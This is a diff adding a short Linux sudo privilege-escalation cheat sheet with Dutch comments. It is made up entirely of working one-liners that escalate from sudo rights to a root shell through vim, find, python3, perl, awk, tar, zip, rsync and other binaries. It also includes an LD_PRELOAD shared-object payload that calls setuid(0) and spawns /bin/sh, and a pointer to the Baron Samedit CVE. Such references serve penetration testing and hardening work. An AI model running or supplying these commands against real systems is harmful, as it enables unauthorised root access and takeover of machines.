@@ -1,0 +1,22 @@
+# Linux sudo Privilege Escalation
+# Check sudo rechten:
+sudo -l
+# Bekende exploiteerbare sudo entries (check GTFOBins):
+# sudo vim: sudo vim -c ':!/bin/sh'
+# sudo find: sudo find . -exec /bin/sh \;
+# sudo python3: sudo python3 -c 'import os; os.system("/bin/sh")'
+# sudo perl: sudo perl -e 'exec "/bin/sh"'
+# sudo awk: sudo awk 'BEGIN {system("/bin/sh")}'
+# sudo less: sudo less /etc/passwd -> !/bin/sh
+# sudo man: sudo man man -> !/bin/sh
+# sudo env: sudo env /bin/sh
+# sudo tar: sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh
+# sudo zip: sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"
+# NOPASSWD + wildcard:
+# sudo /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+# sudo met LD_PRELOAD (als env_keep+=LD_PRELOAD):
+# echo 'void _init(){setuid(0);setgid(0);system("/bin/sh");}' > /tmp/pe.c
+# gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
+# sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
+# Tip: GTFOBins referentie: https://gtfobins.github.io/#+sudo
+# Tip: Check ook: sudo -V (versie) voor CVE's (bijv. CVE-2021-3156 Baron Samedit)
